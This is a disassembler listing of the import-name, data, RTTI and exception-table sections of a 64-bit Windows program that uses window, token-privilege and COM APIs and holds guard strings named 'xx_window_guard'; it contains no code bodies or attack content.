db 'IsWindowVisible',0
word_14000B2F8 dw 22h
db 'CallWindowProcW',0
word_14000B30A dw 0ACh
db 'DefWindowProcW',0
align 4
word_14000B31C dw 208h
db 'GetWindowThreadProcessId',0
align 8
aUser32Dll db 'USER32.dll',0
align 4
word_14000B344 dw 212h
db 'OpenProcessToken',0
align 8
word_14000B358 dw 1Fh
db 'AdjustTokenPrivileges',0
word_14000B370 dw 19Ch
db 'LookupPrivilegeValueW',0
aAdvapi32Dll db 'ADVAPI32.dll',0
align 2
word_14000B396 dw 91h
db 'CoUninitialize',0
align 8
word_14000B3A8 dw 2Bh
db 'CoCreateInstance',0
align 4
word_14000B3BC dw 87h
db 'CoSetProxyBlanket',0
word_14000B3D0 dw 61h
db 'CoInitializeEx',0
align 2
aOle32Dll db 'ole32.dll',0
aOleaut32Dll db 'OLEAUT32.dll',0
align 2
word_14000B3FA dw 51Fh
db '?uncaught_exceptions@std@@YAHXZ',0
word_14000B41C dw 2B4h
db '?cout@std@@3V?$basic_ostream@DU?$ch'
db 'ar_traits@D@std@@@1@A',0
align 8
word_14000B458 dw 4CEh
db '?setw@std@@YA?AU?$_Smanip@_J@1@_J@Z'
db 0
word_14000B47E dw 28Eh
db '?_Xlength_error@std@@YAXPEBD@Z',0
align 20h
word_14000B4A0 dw 2Fh
db '??0?$basic_streambuf@DU?$char_trait'
db 's@D@std@@@std@@IEAA@XZ',0
word_14000B4DC dw 244h
db '?_Osfx@?$basic_ostream@DU?$char_tra'
db 'its@D@std@@@std@@QEAAXXZ',0
word_14000B51A dw 368h
db '?flush@?$basic_ostream@DU?$char_tra'
db 'its@D@std@@@std@@QEAAAEAV12@XZ',0
word_14000B55E dw 4C5h
db '?setstate@?$basic_ios@DU?$char_trai'
db 'ts@D@std@@@std@@QEAAXH_N@Z',0
word_14000B59E dw 0Ch
db '??0?$basic_ios@DU?$char_traits@D@st'
db 'd@@@std@@IEAA@XZ',0
word_14000B5D4 dw 4DEh
db '?sputc@?$basic_streambuf@DU?$char_t'
db 'raits@D@std@@@std@@QEAAHD@Z',0
align 2
word_14000B616 dw 4E1h
db '?sputn@?$basic_streambuf@DU?$char_t'
db 'raits@D@std@@@std@@QEAA_JPEBD_J@Z',0
align 2
word_14000B65E dw 13h
db '??0?$basic_iostream@DU?$char_traits'
db '@D@std@@@std@@QEAA@PEAV?$basic_stre'
db 'ambuf@DU?$char_traits@D@std@@@1@@Z',0
align 2
word_14000B6CA dw 7Dh
db '??1?$basic_ios@DU?$char_traits@D@st'
db 'd@@@std@@UEAA@XZ',0
word_14000B700 dw 89h
db '??1?$basic_streambuf@DU?$char_trait'
db 's@D@std@@@std@@UEAA@XZ',0
word_14000B73C dw 228h
db '?_Lock@?$basic_streambuf@DU?$char_t'
db 'raits@D@std@@@std@@UEAAXXZ',0
word_14000B77C dw 27Fh
db '?_Unlock@?$basic_streambuf@DU?$char'
db '_traits@D@std@@@std@@UEAAXXZ',0
word_14000B7BE dw 4D5h
db '?showmanyc@?$basic_streambuf@DU?$ch'
db 'ar_traits@D@std@@@std@@MEAA_JXZ',0
align 4
word_14000B804 dw 51Bh
db '?uflow@?$basic_streambuf@DU?$char_t'
db 'raits@D@std@@@std@@MEAAHXZ',0
word_14000B844 dw 543h
db '?xsgetn@?$basic_streambuf@DU?$char_'
db 'traits@D@std@@@std@@MEAA_JPEAD_J@Z',0
word_14000B88C dw 546h
db '?xsputn@?$basic_streambuf@DU?$char_'
db 'traits@D@std@@@std@@MEAA_JPEBD_J@Z',0
word_14000B8D4 dw 4B5h
db '?setbuf@?$basic_streambuf@DU?$char_'
db 'traits@D@std@@@std@@MEAAPEAV12@PEAD'
db '_J@Z',0
align 2
word_14000B922 dw 4FDh
db '?sync@?$basic_streambuf@DU?$char_tr'
db 'aits@D@std@@@std@@MEAAHXZ',0
align 2
word_14000B962 dw 3F6h
db '?imbue@?$basic_streambuf@DU?$char_t'
db 'raits@D@std@@@std@@MEAAXAEBVlocale@'
db '2@@Z',0
align 10h
word_14000B9B0 dw 0FEh
db '??6?$basic_ostream@DU?$char_traits@'
db 'D@std@@@std@@QEAAAEAV01@G@Z',0
align 2
word_14000B9F2 dw 80h
db '??1?$basic_iostream@DU?$char_traits'
db '@D@std@@@std@@UEAA@XZ',0
align 2
word_14000BA2E dw 3C5h
db '?good@ios_base@std@@QEBA_NXZ',0
align 2
aMsvcp140Dll db 'MSVCP140.dll',0
align 4
word_14000BA5C dw 0
db '__CxxFrameHandler4',0
align 2
word_14000BA72 dw 22h
db '__std_exception_destroy',0
word_14000BA8C dw 21h
db '__std_exception_copy',0
align 4
word_14000BAA4 dw 46h
db 'wcsstr',0
align 2
word_14000BAAE dw 23h
db '__std_terminate',0
word_14000BAC0 dw 45h
db 'wcsrchr',0
word_14000BACA dw 8
db '__C_specific_handler',0
align 2
word_14000BAE2 dw 1
db '_CxxThrowException',0
align 8
word_14000BAF8 dw 1Bh
db '__current_exception',0
word_14000BB0E dw 1Ch
db '__current_exception_context',0
aVcruntime1401D db 'VCRUNTIME140_1.dll',0
align 20h
aVcruntime140Dl db 'VCRUNTIME140.dll',0
align 2
word_14000BB52 dw 13h
db '__stdio_common_vswprintf_s',0
align 10h
word_14000BB70 dw 0A1h
db 'wcscpy_s',0
align 4
word_14000BB7C dw 9Dh
db 'wcscat_s',0
align 8
word_14000BB88 dw 9Bh
db 'towupper',0
align 4
word_14000BB94 dw 8
db '_callnewh',0
word_14000BBA0 dw 19h
db 'malloc',0
align 2
word_14000BBAA dw 18h
db 'free',0
align 2
word_14000BBB2 dw 40h
db '_seh_filter_exe',0
word_14000BBC4 dw 42h
db '_set_app_type',0
word_14000BBD4 dw 9
db '__setusermatherr',0
align 8
word_14000BBE8 dw 18h
db '_configure_narrow_argv',0
align 2
word_14000BC02 dw 33h
db '_initialize_narrow_environment',0
align 4
word_14000BC24 dw 28h
db '_get_initial_narrow_environment',0
word_14000BC46 dw 36h
db '_initterm',0
word_14000BC52 dw 37h
db '_initterm_e',0
word_14000BC60 dw 55h
db 'exit',0
align 8
word_14000BC68 dw 23h
db '_exit',0
word_14000BC70 dw 54h
db '_set_fmode',0
align 2
word_14000BC7E dw 4
db '__p___argc',0
align 4
word_14000BC8C dw 5
db '__p___argv',0
align 2
word_14000BC9A dw 16h
db '_cexit',0
align 4
word_14000BCA4 dw 15h
db '_c_exit',0
word_14000BCAE dw 3Dh
db '_register_thread_local_exe_atexit_c'
db 'allback',0
align 4
word_14000BCDC dw 8
db '_configthreadlocale',0
word_14000BCF2 dw 16h
db '_set_new_mode',0
word_14000BD02 dw 1
db '__p__commode',0
align 2
word_14000BD12 dw 34h
db '_initialize_onexit_table',0
align 2
word_14000BD2E dw 3Ch
db '_register_onexit_function',0
word_14000BD4A dw 1Eh
db '_crt_atexit',0
word_14000BD58 dw 67h
db 'terminate',0
aApiMsWinCrtHea db 'api-ms-win-crt-heap-l1-1-0.dll',0
align 4
aApiMsWinCrtStd db 'api-ms-win-crt-stdio-l1-1-0.dll',0
aApiMsWinCrtStr db 'api-ms-win-crt-string-l1-1-0.dll',0
align 2
aApiMsWinCrtRun db 'api-ms-win-crt-runtime-l1-1-0.dll',0
aApiMsWinCrtMat db 'api-ms-win-crt-math-l1-1-0.dll',0
align 8
aApiMsWinCrtLoc db 'api-ms-win-crt-locale-l1-1-0.dll',0
align 2
word_14000BE2A dw 484h
db 'QueryPerformanceCounter',0
word_14000BE44 dw 249h
db 'GetCurrentThreadId',0
align 2
word_14000BE5A dw 31Dh
db 'GetSystemTimeAsFileTime',0
word_14000BE74 dw 39Dh
db 'InitializeSListHead',0
word_14000BE8A dw 5BBh
db 'SetUnhandledExceptionFilter',0
word_14000BEA8 dw 3Ch
db 'memcpy',0
align 2
word_14000BEB2 dw 3Dh
db 'memmove',0
word_14000BEBC dw 3Eh
db 'memset',0
align 2
word_14000BEC6 dw 8Bh
db 'strlen',0
align 10h
word_14000BED0 dw 0A3h
db 'wcslen',0
align 200h
_rdata ends

; Section 3. (virtual address 0000C000)
; Virtual size                  : 00000580 (   1408.)
; Section size in file          : 00000600 (   1536.)
; Offset to raw data for section: 0000A800
; Flags C0000040: Data Readable Writable
; Alignment     : default

; Segment type: Pure data
; Segment permissions: Read/Write
_data segment para public 'DATA' use64
assume cs:_data
;org 14000C000h
; uintptr_t _security_cookie
__security_cookie dq 2B992DDFA232h
align 40h
qword_14000C040 dq 0FFFFD466D2205DCDh
db 0FFh
db 0FFh
db 0FFh
db 0FFh
dword_14000C04C dd 1
dword_14000C050 dd 1
dword_14000C054 dd 2
qword_14000C058 dq 80000h
qword_14000C060 dq 2000000h
qword_14000C068 dq 0FFFFFFFFFFFFFFFFh
dword_14000C070 dd 1
align 8
aXxWindowGuard:
text "UTF-16LE", 'xx_window_guard',0
aGlobalXxWindow:
text "UTF-16LE", 'Global\xx_window_guar'
text "UTF-16LE", 'd',0
align 8
qword_14000C0C8 dq 0FFFFFFFFFFFFFFFFh
qword_14000C0D0 dq 0
qword_14000C0D8 dq 0
qword_14000C0E0 dq 0
; HANDLE hObject
hObject dq 0FFFFFFFFFFFFFFFFh
; HANDLE qword_14000C0F0
qword_14000C0F0 dq 0
; HANDLE qword_14000C0F8
qword_14000C0F8 dq 0
; HANDLE qword_14000C100
qword_14000C100 dq 0
; HANDLE qword_14000C108
qword_14000C108 dq 0
; HANDLE qword_14000C110
qword_14000C110 dq 0
; HANDLE qword_14000C118
qword_14000C118 dq 0
aXxWindowMakeGu:
text "UTF-16LE", 'xx_window_make_guard',0
align 10h
; public class std::bad_alloc /* mdisp:0 */ :
;   public class std::exception /* mdisp:0 */
; class std::bad_alloc `RTTI Type Descriptor'
??_R0?AVbad_alloc@std@@@8 dq offset ??_7type_info@@6B@ ; reference to RTTI's vftable
dq 0                    ; internal runtime reference
aAvbadAllocStd db '.?AVbad_alloc@std@@',0 ; type descriptor name
align 8
; public class std::exception /* mdisp:0 */
; class std::exception `RTTI Type Descriptor'
??_R0?AVexception@std@@@8 dq offset ??_7type_info@@6B@ ; reference to RTTI's vftable
dq 0                    ; internal runtime reference
aAvexceptionStd db '.?AVexception@std@@',0 ; type descriptor name
align 20h
; public class std::bad_array_new_length /* mdisp:0 */ :
;   public class std::bad_alloc /* mdisp:0 */ :
;     public class std::exception /* mdisp:0 */
; class std::bad_array_new_length `RTTI Type Descriptor'
??_R0?AVbad_array_new_length@std@@@8 dq offset ??_7type_info@@6B@ ; reference to RTTI's vftable
dq 0                    ; internal runtime reference
aAvbadArrayNewL db '.?AVbad_array_new_length@std@@',0 ; type descriptor name
align 10h
; public class type_info /* mdisp:0 */
; class type_info `RTTI Type Descriptor'
??_R0?AVtype_info@@@8 dq offset ??_7type_info@@6B@ ; reference to RTTI's vftable
dq 0                    ; internal runtime reference
aAvtypeInfo db '.?AVtype_info@@',0 ; type descriptor name
; public class std::basic_stringstream<char,struct std::char_traits<char>,class std::allocator<char>> /* mdisp:0 */ :
;   public class std::basic_iostream<char,struct std::char_traits<char>> /* mdisp:0 */ :
;     public class std::basic_istream<char,struct std::char_traits<char>> /* mdisp:0 */ :
;       public virtual class std::basic_ios<char,struct std::char_traits<char>> /* mdisp:0 pdisp:0 vdisp:4 */ :
;         public class std::ios_base /* mdisp:0 pdisp:0 vdisp:4 */ :
;           public class std::_Iosb<int> /* mdisp:8 pdisp:0 vdisp:4 */,
;     public class std::basic_ostream<char,struct std::char_traits<char>> /* mdisp:16 */ :
;       public virtual class std::basic_ios<char,struct std::char_traits<char>> /* mdisp:0 pdisp:0 vdisp:4 */ :
;         public class std::ios_base /* mdisp:0 pdisp:0 vdisp:4 */ :
;           public class std::_Iosb<int> /* mdisp:8 pdisp:0 vdisp:4 */
; class std::basic_stringstream<char, struct std::char_traits<char>, class std::allocator<char>> `RTTI Type Descriptor'
??_R0?AV?$basic_stringstream@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@8 dq offset ??_7type_info@@6B@ ; reference to RTTI's vftable
dq 0                    ; internal runtime reference
aAvBasicStrings db '.?AV?$basic_stringstream@DU?$char_t' ; type descriptor name
db 'raits@D@std@@V?$allocator@D@2@@std@'
db '@',0
align 10h
; public class std::basic_stringbuf<char,struct std::char_traits<char>,class std::allocator<char>> /* mdisp:0 */ :
;   public class std::basic_streambuf<char,struct std::char_traits<char>> /* mdisp:0 */
; class std::basic_stringbuf<char, struct std::char_traits<char>, class std::allocator<char>> `RTTI Type Descriptor'
??_R0?AV?$basic_stringbuf@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@8 dq offset ??_7type_info@@6B@ ; reference to RTTI's vftable
dq 0                    ; internal runtime reference
aAvBasicStringb db '.?AV?$basic_stringbuf@DU?$char_trai' ; type descriptor name
db 'ts@D@std@@V?$allocator@D@2@@std@@',0
align 8
; public class std::ios_base /* mdisp:0 */ :
;   public class std::_Iosb<int> /* mdisp:8 */
; class std::ios_base `RTTI Type Descriptor'
??_R0?AVios_base@std@@@8 dq offset ??_7type_info@@6B@ ; reference to RTTI's vftable
dq 0                    ; internal runtime reference
aAviosBaseStd db '.?AVios_base@std@@',0 ; type descriptor name
align 10h
; public class std::basic_iostream<char,struct std::char_traits<char>> /* mdisp:0 */ :
;   public class std::basic_istream<char,struct std::char_traits<char>> /* mdisp:0 */ :
;     public virtual class std::basic_ios<char,struct std::char_traits<char>> /* mdisp:0 pdisp:0 vdisp:4 */ :
;       public class std::ios_base /* mdisp:0 pdisp:0 vdisp:4 */ :
;         public class std::_Iosb<int> /* mdisp:8 pdisp:0 vdisp:4 */,
;   public class std::basic_ostream<char,struct std::char_traits<char>> /* mdisp:16 */ :
;     public virtual class std::basic_ios<char,struct std::char_traits<char>> /* mdisp:0 pdisp:0 vdisp:4 */ :
;       public class std::ios_base /* mdisp:0 pdisp:0 vdisp:4 */ :
;         public class std::_Iosb<int> /* mdisp:8 pdisp:0 vdisp:4 */
; class std::basic_iostream<char, struct std::char_traits<char>> `RTTI Type Descriptor'
??_R0?AV?$basic_iostream@DU?$char_traits@D@std@@@std@@@8 dq offset ??_7type_info@@6B@ ; reference to RTTI's vftable
dq 0                    ; internal runtime reference
aAvBasicIostrea db '.?AV?$basic_iostream@DU?$char_trait' ; type descriptor name
db 's@D@std@@@std@@',0
align 8
; public class std::_Iosb<int> /* mdisp:0 */
; class std::_Iosb<int> `RTTI Type Descriptor'
??_R0?AV?$_Iosb@H@std@@@8 dq offset ??_7type_info@@6B@ ; reference to RTTI's vftable
dq 0                    ; internal runtime reference
aAvIosbHStd db '.?AV?$_Iosb@H@std@@',0 ; type descriptor name
align 20h
; public class std::basic_streambuf<char,struct std::char_traits<char>> /* mdisp:0 */
; class std::basic_streambuf<char, struct std::char_traits<char>> `RTTI Type Descriptor'
??_R0?AV?$basic_streambuf@DU?$char_traits@D@std@@@std@@@8 dq offset ??_7type_info@@6B@ ; reference to RTTI's vftable
dq 0                    ; internal runtime reference
aAvBasicStreamb db '.?AV?$basic_streambuf@DU?$char_trai' ; type descriptor name
db 'ts@D@std@@@std@@',0
align 10h
; public class std::basic_istream<char,struct std::char_traits<char>> /* mdisp:0 */ :
;   public virtual class std::basic_ios<char,struct std::char_traits<char>> /* mdisp:0 pdisp:0 vdisp:4 */ :
;     public class std::ios_base /* mdisp:0 pdisp:0 vdisp:4 */ :
;       public class std::_Iosb<int> /* mdisp:8 pdisp:0 vdisp:4 */
; class std::basic_istream<char, struct std::char_traits<char>> `RTTI Type Descriptor'
??_R0?AV?$basic_istream@DU?$char_traits@D@std@@@std@@@8 dq offset ??_7type_info@@6B@ ; reference to RTTI's vftable
dq 0                    ; internal runtime reference
aAvBasicIstream db '.?AV?$basic_istream@DU?$char_traits' ; type descriptor name
db '@D@std@@@std@@',0
align 8
; public class std::basic_ios<char,struct std::char_traits<char>> /* mdisp:0 */ :
;   public class std::ios_base /* mdisp:0 */ :
;     public class std::_Iosb<int> /* mdisp:8 */
; class std::basic_ios<char, struct std::char_traits<char>> `RTTI Type Descriptor'
??_R0?AV?$basic_ios@DU?$char_traits@D@std@@@std@@@8 dq offset ??_7type_info@@6B@ ; reference to RTTI's vftable
dq 0                    ; internal runtime reference
aAvBasicIosDuCh db '.?AV?$basic_ios@DU?$char_traits@D@s' ; type descriptor name
db 'td@@@std@@',0
align 20h
; public class std::basic_ostream<char,struct std::char_traits<char>> /* mdisp:0 */ :
;   public virtual class std::basic_ios<char,struct std::char_traits<char>> /* mdisp:0 pdisp:0 vdisp:4 */ :
;     public class std::ios_base /* mdisp:0 pdisp:0 vdisp:4 */ :
;       public class std::_Iosb<int> /* mdisp:8 pdisp:0 vdisp:4 */
; class std::basic_ostream<char, struct std::char_traits<char>> `RTTI Type Descriptor'
??_R0?AV?$basic_ostream@DU?$char_traits@D@std@@@std@@@8 dq offset ??_7type_info@@6B@ ; reference to RTTI's vftable
dq 0                    ; internal runtime reference
aAvBasicOstream db '.?AV?$basic_ostream@DU?$char_traits' ; type descriptor name
db '@D@std@@@std@@',0
align 10h
dword_14000C470 dd 0
align 8
qword_14000C478 dq 0
byte_14000C480 db 0
byte_14000C481 db 0
align 8
; _onexit_table_t Table
Table _onexit_table_t <0>
; _onexit_table_t stru_14000C4A0
stru_14000C4A0 _onexit_table_t <0>
align 20h
unk_14000C4C0 db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
unk_14000C4D0 db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
dword_14000C4DC dd 0
dword_14000C4E0 dd 0
align 8
dword_14000C4E8 dd 0
align 10h
qword_14000C4F0 dq 0
qword_14000C4F8 dq 0
; HWND hWnd
hWnd dq 0
; size_t Size
Size dq 0
qword_14000C510 dq 0
; void *Src
Src dq 0
; struct _RTL_CRITICAL_SECTION CriticalSection
CriticalSection _RTL_CRITICAL_SECTION <0>
qword_14000C548 dq 0
; HWND qword_14000C550
qword_14000C550 dq 0
align 20h
; WNDPROC lpPrevWndFunc
lpPrevWndFunc dq 0
unk_14000C568 db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
unk_14000C570 db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
unk_14000C578 db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
align 1000h
_data ends

; Section 4. (virtual address 0000D000)
; Virtual size                  : 000004B0 (   1200.)
; Section size in file          : 00000600 (   1536.)
; Offset to raw data for section: 0000AE00
; Flags 40000040: Data Readable
; Alignment     : default

; Segment type: Pure data
; Segment permissions: Read
_pdata segment para public 'DATA' use64
assume cs:_pdata
;org 14000D000h
ExceptionDir RUNTIME_FUNCTION <rva sub_140001010, \
                  rva algn_140001068, \
                  rva stru_14000A078>
RUNTIME_FUNCTION <rva sub_140001070, \
                  rva algn_1400010A3, \
                  rva stru_14000A088>
RUNTIME_FUNCTION <rva sub_1400010D0, \
                  rva algn_140001113, \
                  rva stru_14000A090>
RUNTIME_FUNCTION <rva sub_140001170, \
                  rva sub_140001190, \
                  rva stru_14000A09C>
RUNTIME_FUNCTION <rva sub_140001190, \
                  rva algn_1400011CD, \
                  rva stru_14000A088>
RUNTIME_FUNCTION <rva sub_1400011D0, \
                  rva algn_14000120D, \
                  rva stru_14000A088>
RUNTIME_FUNCTION <rva sub_140001210, \
                  rva algn_140001222, \
                  rva stru_14000A0A4>
RUNTIME_FUNCTION <rva sub_140001230, \
                  rva algn_140001778, \
                  rva stru_14000A0AC>
RUNTIME_FUNCTION <rva sub_140001780, \
                  rva algn_140001B4F, \
                  rva stru_14000A0B4>
RUNTIME_FUNCTION <rva sub_140001B50, \
                  rva algn_140001BA4, \
                  rva stru_14000A088>
RUNTIME_FUNCTION <rva sub_140001BB0, \
                  rva algn_140001D66, \
                  rva stru_14000A11C>
RUNTIME_FUNCTION <rva sub_140001D70, \
                  rva algn_140001E65, \
                  rva stru_14000A0A4>
RUNTIME_FUNCTION <rva StartAddress, \
                  rva algn_140001ED4, \
                  rva stru_14000A088>
RUNTIME_FUNCTION <rva sub_140001EE0, \
                  rva algn_140001F7D, \
                  rva stru_14000A13C>
RUNTIME_FUNCTION <rva sub_140001F80, \
                  rva algn_1400021B4, \
                  rva stru_14000A144>
RUNTIME_FUNCTION <rva sub_1400021C0, \
                  rva loc_140002237, \
                  rva stru_14000A184>
RUNTIME_FUNCTION <rva loc_140002237, \
                  rva loc_1400023C0, \
                  rva stru_14000A198>
RUNTIME_FUNCTION <rva loc_1400023C0, \
                  rva loc_140002774, \
                  rva stru_14000A1AC>
RUNTIME_FUNCTION <rva loc_140002774, \
                  rva loc_1400027DA, \
                  rva stru_14000A1C0>
RUNTIME_FUNCTION <rva loc_1400027DA, \
                  rva algn_1400027F2, \
                  rva stru_14000A1D0>
RUNTIME_FUNCTION <rva sub_140002800, \
                  rva algn_140002816, \
                  rva stru_14000A0A4>
RUNTIME_FUNCTION <rva sub_140002820, \
                  rva algn_14000292F, \
                  rva stru_14000A1E0>
RUNTIME_FUNCTION <rva sub_140002930, \
                  rva algn_140002A82, \
                  rva stru_14000A1F0>
RUNTIME_FUNCTION <rva sub_140002A90, \
                  rva algn_140002D28, \
                  rva stru_14000A224>
RUNTIME_FUNCTION <rva sub_140002D30, \
                  rva loc_140002D62, \
                  rva stru_14000A260>
RUNTIME_FUNCTION <rva loc_140002D62, \
                  rva loc_140002D7D, \
                  rva stru_14000A274>
RUNTIME_FUNCTION <rva loc_140002D7D, \
                  rva loc_140002D97, \
                  rva stru_14000A288>
RUNTIME_FUNCTION <rva loc_140002D97, \
                  rva algn_140002DE8, \
                  rva stru_14000A298>
RUNTIME_FUNCTION <rva sub_140002DF0, \
                  rva algn_140002EDB, \
                  rva stru_14000A2AC>
RUNTIME_FUNCTION <rva sub_140002EE0, \
                  rva sub_1400034A0, \
                  rva stru_14000A2BC>
RUNTIME_FUNCTION <rva sub_1400034A0, \
                  rva algn_140003798, \
                  rva stru_14000A30C>
RUNTIME_FUNCTION <rva EnumFunc, \
                  rva algn_140003842, \
                  rva stru_14000A348>
RUNTIME_FUNCTION <rva sub_140003850, \
                  rva algn_1400045D6, \
                  rva stru_14000A360>
RUNTIME_FUNCTION <rva Handler, \
                  rva algn_14000474C, \
                  rva stru_14000A3A0>
RUNTIME_FUNCTION <rva sub_140004750, \
                  rva sub_140004780, \
                  rva stru_14000A3CC>
RUNTIME_FUNCTION <rva sub_140004780, \
                  rva algn_140004878, \
                  rva stru_14000A3D4>
RUNTIME_FUNCTION <rva sub_1400048B0, \
                  rva algn_140004F54, \
                  rva stru_14000A3E0>
RUNTIME_FUNCTION <rva sub_140004F60, \
                  rva loc_14000506C, \
                  rva stru_14000A414>
RUNTIME_FUNCTION <rva loc_14000506C, \
                  rva algn_1400051A1, \
                  rva stru_14000A428>
RUNTIME_FUNCTION <rva sub_1400051B0, \
                  rva algn_140005376, \
                  rva stru_14000A440>
RUNTIME_FUNCTION <rva sub_140005380, \
                  rva algn_1400053DB, \
                  rva stru_14000A4A4>
RUNTIME_FUNCTION <rva sub_1400053E0, \
                  rva algn_140005445, \
                  rva stru_14000A088>
RUNTIME_FUNCTION <rva sub_140005450, \
                  rva loc_1400054F2, \
                  rva stru_14000A4B0>
RUNTIME_FUNCTION <rva loc_1400054F2, \
                  rva loc_140005549, \
                  rva stru_14000A4C4>
RUNTIME_FUNCTION <rva loc_140005549, \
                  rva algn_140005572, \
                  rva stru_14000A4D8>
RUNTIME_FUNCTION <rva sub_140005580, \
                  rva algn_140005719, \
                  rva stru_14000A4E8>
RUNTIME_FUNCTION <rva sub_1400057E0, \
                  rva algn_1400059DC, \
                  rva stru_14000A504>
RUNTIME_FUNCTION <rva sub_1400059E0, \
                  rva algn_140005A9C, \
                  rva stru_14000A088>
RUNTIME_FUNCTION <rva sub_140005AA0, \
                  rva algn_140005B32, \
                  rva stru_14000A51C>
RUNTIME_FUNCTION <rva sub_140005B40, \
                  rva algn_140005B74, \
                  rva stru_14000A090>
RUNTIME_FUNCTION <rva sub_140005B80, \
                  rva algn_140005D4A, \
                  rva stru_14000A52C>
RUNTIME_FUNCTION <rva sub_140005D50, \
                  rva algn_140005D8E, \
                  rva stru_14000A578>
RUNTIME_FUNCTION <rva sub_140005D90, \
                  rva loc_140005DB9, \
                  rva stru_14000A59C>
RUNTIME_FUNCTION <rva loc_140005DB9, \
                  rva loc_140005F14, \
                  rva stru_14000A5A8>
RUNTIME_FUNCTION <rva loc_140005F14, \
                  rva loc_140005F1A, \
                  rva stru_14000A5C8>
RUNTIME_FUNCTION <rva loc_140005F1A, \
                  rva sub_140005F20, \
                  rva stru_14000A5D8>
RUNTIME_FUNCTION <rva sub_140005F20, \
                  rva algn_140005F44, \
                  rva stru_14000A5F8>
RUNTIME_FUNCTION <rva sub_140005F50, \
                  rva loc_140005F79, \
                  rva stru_14000A59C>
RUNTIME_FUNCTION <rva loc_140005F79, \
                  rva loc_1400060B4, \
                  rva stru_14000A610>
RUNTIME_FUNCTION <rva loc_1400060B4, \
                  rva loc_1400060BA, \
                  rva stru_14000A62C>
RUNTIME_FUNCTION <rva loc_1400060BA, \
                  rva sub_1400060C0, \
                  rva stru_14000A63C>
RUNTIME_FUNCTION <rva sub_1400060C0, \
                  rva loc_14000611F, \
                  rva stru_14000A658>
RUNTIME_FUNCTION <rva loc_14000611F, \
                  rva loc_140006212, \
                  rva stru_14000A668>
RUNTIME_FUNCTION <rva loc_140006212, \
                  rva loc_140006218, \
                  rva stru_14000A67C>
RUNTIME_FUNCTION <rva loc_140006218, \
                  rva algn_14000621E, \
                  rva stru_14000A68C>
RUNTIME_FUNCTION <rva __security_check_cookie,\
                  rva algn_14000629E, \
                  rva stru_14000A6A0>
RUNTIME_FUNCTION <rva sub_1400062C0, \
                  rva algn_140006304, \
                  rva stru_14000A088>
RUNTIME_FUNCTION <rva sub_140006340, \
                  rva algn_14000636B, \
                  rva stru_14000A088>
RUNTIME_FUNCTION <rva sub_140006370, \
                  rva algn_140006426, \
                  rva stru_14000A088>
RUNTIME_FUNCTION <rva sub_140006430, \
                  rva sub_140006440, \
                  rva stru_14000A0A4>
RUNTIME_FUNCTION <rva sub_140006440, \
                  rva algn_140006459, \
                  rva stru_14000A0A4>
RUNTIME_FUNCTION <rva sub_140006460, \
                  rva algn_1400065DF, \
                  rva stru_14000A6A4>
RUNTIME_FUNCTION <rva start, \
                  rva algn_1400065F2, \
                  rva stru_14000A0A4>
RUNTIME_FUNCTION <rva sub_140006630, \
                  rva sub_140006650, \
                  rva stru_14000A09C>
RUNTIME_FUNCTION <rva sub_140006650, \
                  rva algn_140006697, \
                  rva stru_14000A0A4>
RUNTIME_FUNCTION <rva sub_1400066A0, \
                  rva algn_1400066DB, \
                  rva stru_14000A0A4>
RUNTIME_FUNCTION <rva sub_1400066E0, \
                  rva algn_140006773, \
                  rva stru_14000A088>
RUNTIME_FUNCTION <rva sub_140006780, \
                  rva algn_140006811, \
                  rva stru_14000A6DC>
RUNTIME_FUNCTION <rva sub_140006820, \
                  rva algn_140006845, \
                  rva stru_14000A088>
RUNTIME_FUNCTION <rva sub_140006850, \
                  rva algn_14000687B, \
                  rva stru_14000A088>
RUNTIME_FUNCTION <rva sub_140006880, \
                  rva sub_1400068C0, \
                  rva stru_14000A088>
RUNTIME_FUNCTION <rva sub_1400068C0, \
                  rva algn_14000697F, \
                  rva stru_14000A13C>
RUNTIME_FUNCTION <rva sub_1400069F0, \
                  rva algn_140006A0B, \
                  rva stru_14000A0A4>
RUNTIME_FUNCTION <rva sub_140006A60, \
                  rva algn_140006AB5, \
                  rva stru_14000A0A4>
RUNTIME_FUNCTION <rva sub_140006AD0, \
                  rva algn_140006B2B, \
                  rva stru_14000A090>
RUNTIME_FUNCTION <rva sub_140006B30, \
                  rva algn_140006B72, \
                  rva stru_14000A090>
RUNTIME_FUNCTION <rva Function, \
                  rva algn_140006BC2, \
                  rva stru_14000A090>
RUNTIME_FUNCTION <rva sub_140006BD0, \
                  rva loc_140006BDB, \
                  rva stru_14000A704>
RUNTIME_FUNCTION <rva loc_140006BDB, \
                  rva loc_140006D13, \
                  rva stru_14000A710>
RUNTIME_FUNCTION <rva loc_140006D13, \
                  rva algn_140006E78, \
                  rva stru_14000A728>
RUNTIME_FUNCTION <rva __GSHandlerCheck, \
                  rva algn_140006F6D, \
                  rva stru_14000A0A4>
RUNTIME_FUNCTION <rva sub_140006F70, \
                  rva algn_140007149, \
                  rva stru_14000A74C>
RUNTIME_FUNCTION <rva sub_140007150, \
                  rva memcpy, \
                  rva stru_14000A760>
RUNTIME_FUNCTION <rva _guard_dispatch_icall_nop,\
                  rva byte_1400071F2, \
                  rva stru_14000A740>
